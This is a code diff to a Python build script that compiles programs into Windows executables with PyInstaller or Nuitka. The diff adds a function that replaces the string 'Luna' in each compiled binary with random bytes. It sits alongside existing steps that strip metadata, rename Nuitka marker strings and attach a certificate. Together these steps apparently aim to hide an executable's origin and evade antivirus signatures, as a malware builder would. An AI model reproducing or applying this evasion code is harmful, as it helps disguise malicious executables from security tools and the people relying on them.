@@ -662,6 +662,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 
 				subprocess.run(command)
 				self.RemoveMetaData(f"./{filename}.exe")
+				self.RenameEntryPoint(f"./{filename}.exe", "Luna")
 				self.AddCertificate(f"./{filename}.exe")
 				logging.info(f"Successfully compiled {filename}.exe with pyinstaller")
 
@@ -694,6 +695,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 					except Exception as e:
 						logging.error(f"Error with compiling file: {e}")
 				self.RemoveMetaData(f"./{filename}.exe")
+				self.RenameEntryPoint(f"./{filename}.exe", "Luna")
 				self.AddCertificate(f"./{filename}.exe")
 
 		except Exception as e:
@@ -815,6 +817,18 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 		data = data.replace(b"NUITKA_ONEFILE_PARENT", b"NUKTEM_ONEFILE_PARENT")
 		data = data.replace(b"NUITKA_ONEFILE_BINARY", b"NUKTEM_ONEFILE_BINARY")
 		
+		with open(path, "wb") as file:
+			file.write(data)
+			
+	def RenameEntryPoint(self, path: str, entryPoint: str):
+		print("Renaming Entry Point")
+		with open(path, "rb") as file:
+			data = file.read()
+	
+		entryPoint = entryPoint.encode()
+		new_entryPoint = b'\x00' + os.urandom(len(entryPoint) - 1)
+		data = data.replace(entryPoint, new_entryPoint)
+	
 		with open(path, "wb") as file:
 			file.write(data)
 
